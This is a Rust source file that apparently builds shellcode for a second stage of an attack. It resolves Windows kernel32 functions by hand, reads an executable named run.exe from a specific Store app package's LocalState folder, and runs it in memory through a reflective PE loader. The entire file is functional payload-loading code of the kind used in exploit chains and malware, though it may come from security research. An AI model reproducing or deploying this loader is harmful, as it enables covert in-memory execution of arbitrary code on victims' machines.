#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

extern crate compiler_builtins;

use core::arch::asm;
use core::panic::PanicInfo;

use shellcode_utils::prelude::*;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

#[no_mangle]
pub extern "C" fn main() -> u32 {
    // unsafe {
    //     asm!("int 3");
    // }
    unsafe { asm!("and rsp, ~0xf") };

    // unsafe {
    //     // clean argc and argv
    //     asm!("mov rcx, 0", "mov rdx, 0",);
    // }

    let kernel32_ptr = get_kernel32();

    let OutputDebugStringA = fetch_output_debug_string(kernel32_ptr);
    macro_rules! debug_print {
        ($msg:expr) => {
            unsafe { OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _) }
        };
    }

    debug_print!("Hello from stage2");

    let ReadFile = fetch_read_file(kernel32_ptr);
    let CreateFileA = fetch_create_file(kernel32_ptr);
    let VirtualAlloc = fetch_virtual_alloc(kernel32_ptr);
    let VirtualProtect = fetch_virtual_protect(kernel32_ptr);
    let GetFileSize = fetch_get_file_size(kernel32_ptr);
    let GetProcAddress = fetch_get_proc_address(kernel32_ptr);
    let LoadLibraryA = fetch_load_library(kernel32_ptr);
    let CreateThread = fetch_create_thread(kernel32_ptr);
    let RtlAddFunctionTable = fetch_rtl_add_fn_table(kernel32_ptr);
    let GetModuleHandleA = fetch_get_module_handle(kernel32_ptr);

    // let wsprintfa_ptr = get_func_by_name(u32_dll, wsprintfa_.as_ptr());
    // if wsprintfa_ptr.is_null() {
    //     unsafe {
    //         asm!("int 3");
    //     }
    // }
    // let wsprintfa: wsprintfaFn = unsafe { core::mem::transmute(wsprintfa_ptr) };

    let stage2_filename = concat!(
        r#"C:\Users\lander\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\run.exe"#,
        "\0"
    );

    // Open the stage2 payload
    let handle = unsafe {
        CreateFileA(
            stage2_filename.as_ptr() as *const i8,
            CreateFileAccess::GenericRead as u32,
            0,
            core::ptr::null_mut() as PVOID,
            4,    // OPEN_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut() as PVOID,
        )
    };

    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };

    // Allocate memory for the stage 2 payload
    let stage2_data =
        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };

    // Read the entire PE file to memory. This is a bit unnecessary, but whatever
    unsafe {
        ReadFile(
            handle,
            stage2_data,
            stage2_size,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };

    let pe_data =
        unsafe { core::slice::from_raw_parts(stage2_data as *const u8, stage2_size as usize) };

    // unsafe { asm!("int 3") };

    unsafe {
        rspe::reflective_loader(
            pe_data,
            VirtualAlloc,
            VirtualProtect,
            GetProcAddress,
            LoadLibraryA,
            CreateThread,
            RtlAddFunctionTable,
            GetModuleHandleA,
        );
    }

    // unsafe { asm!("mov rax, 0x1337; ret") };

    0x1337
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
